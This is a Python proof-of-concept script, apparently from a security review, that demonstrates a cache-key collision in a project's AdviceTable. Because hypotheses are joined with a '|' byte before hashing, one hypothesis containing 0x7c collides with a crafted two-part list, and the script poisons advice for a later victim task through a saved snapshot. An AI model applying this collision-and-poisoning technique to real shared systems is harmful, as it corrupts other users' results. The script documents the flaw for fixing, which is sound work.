"""R17.6 Demonstrate the full R3.3 collision attack chain on v7.5.

An attacker who can submit ONE identify task can poison advice for a
DIFFERENT hypothesis set that the victim will later use.

The vulnerability is in AdviceTable._key:
    h_hash = sha256(b"|".join(hypotheses)).hexdigest()[:16]

The b"|".join is reversible when hypothesis bytes contain b"|", so
two different hypothesis lists can produce the same fingerprint.
"""
import sys, hashlib, tempfile, json
sys.path.insert(0, '/home/z/my-project/download')
from srs import Runtime, Task
from pathlib import Path

# Step 1: find a hypothesis that contains the byte 0x7c (|)
# Attacker can scan publicly-known hypothesis values (e.g., from logs or
# from seeing what hypothesis sets the victim uses)
print("=== Step 1: Attacker finds a hypothesis set the victim will use ===")
victim_hyps = [hashlib.sha256(f"h{i}".encode()).digest() for i in range(64)]
print(f"victim_hyps has {len(victim_hyps)} hypotheses (sha256 of h0..h63)")

# Find one that contains the byte 0x7c
target_h = None
target_pos = None
target_idx = None
for i, h in enumerate(victim_hyps):
    if 0x7c in h:
        target_h = h
        target_pos = h.index(0x7c)
        target_idx = i
        break

if target_h is None:
    print("No hypothesis contains 0x7c; trying with different seeds")
    # Try with different hypothesis values
    for i in range(1000):
        h = hashlib.sha256(f"victim_seed_{i}".encode()).digest()
        if 0x7c in h:
            target_h = h
            target_pos = h.index(0x7c)
            target_idx = i
            print(f"Found: hypothesis {i} contains 0x7c at byte {target_pos}")
            break

print(f"Target hypothesis: h[{target_idx}] = {target_h.hex()}")
print(f"  Contains 0x7c at byte {target_pos}")

# Step 2: construct evil_hyps that join to the same bytes as victim_hyps[target_idx]
print("\n=== Step 2: Attacker constructs colliding evil_hyps ===")
# Victim's hypothesis set: [target_h]  (1 element)
# Evil's hypothesis set:   [target_h[:target_pos], target_h[target_pos+1:]]  (2 elements)
# When joined with b"|", both produce target_h bytes.
evil_a = target_h[:target_pos]
evil_b = target_h[target_pos+1:]
evil_hyps = [evil_a, evil_b]
print(f"evil_hyps = [{evil_a.hex()[:16]}..., {evil_b.hex()[:16]}...]")
print(f"victim_hyps = [{target_h.hex()[:16]}...]")
print(f"  (length differs: {len(evil_hyps)} vs 1)")

# Verify collision
key_victim = hashlib.sha256(b"|".join([target_h])).hexdigest()[:16]
key_evil = hashlib.sha256(b"|".join(evil_hyps)).hexdigest()[:16]
print(f"\nKey for victim_hyps: {key_victim}")
print(f"Key for evil_hyps:   {key_evil}")
print(f"COLLISION: {key_victim == key_evil}")

# Step 3: attacker runs an identify task with evil_hyps and target_idx=0
# This will set advice[key] = 0 for the (evil_hyps, 0) pair.
# But because the key collides, the same advice will be returned for
# (victim_hyps[target_idx:target_idx+1], 0).
print("\n=== Step 3: Attacker runs identify with evil_hyps, target=0 ===")
with tempfile.TemporaryDirectory() as tmp:
    rt = Runtime(home=Path(tmp))
    attack_task = Task(kind="identify",
                       payload={"hypotheses": evil_hyps, "target_idx": 0,
                                "n_features": 12},
                       budget=16,
                       task_id="attacker_setup")
    r_attack = rt.execute(attack_task)
    print(f"Attacker task: correct={r_attack.correct} answer={r_attack.answer}")
    print(f"  advice._table = {rt.advice._table}")

    rt.store_state()

    # Step 4: victim loads the snapshot and runs identify with their hypothesis set
    print("\n=== Step 4: Victim loads snapshot and runs identify ===")
    rt2 = Runtime(home=Path(tmp))
    rt2.recover()
    print(f"Victim's loaded advice: {rt2.advice._table}")

    # Victim uses [target_h] as their hypothesis list (1 element)
    # with target_idx=0 — this should return target_h itself, which IS correct
    # BUT if the attacker had set advice[key] = 999, the victim would get 999.
    victim_task = Task(kind="identify",
                       payload={"hypotheses": [target_h], "target_idx": 0,
                                "n_features": 12},
                       budget=16,
                       task_id="victim_task")
    r_victim = rt2.execute(victim_task)
    print(f"\nVictim task: correct={r_victim.correct} answer={r_victim.answer}")
    print(f"  queries={r_victim.queries} (0 means advice was used)")
    print(f"  used_advice={r_victim.notes.get('used_advice')}")
    print(f"  advice_hit={r_victim.notes.get('advice_hit')}")

    # The victim got back advice built for a DIFFERENT hypothesis set
    # (evil_hyps with 2 elements, not victim_hyps with 1 element)
    # This is the attack: the runtime returned an answer for the wrong hypothesis set.

    # Now show a more dangerous variant: attacker sets a WRONG answer via tampering
    print("\n=== Step 5: Combine with advice_hash bypass (R17.3) ===")
    print("Attacker can ALSO tamper the snapshot to set ANY answer value,")
    print("then recompute the advice_hash to pass the integrity check.")
    print("(See r17_advice_poisoning.py for that proof.)")
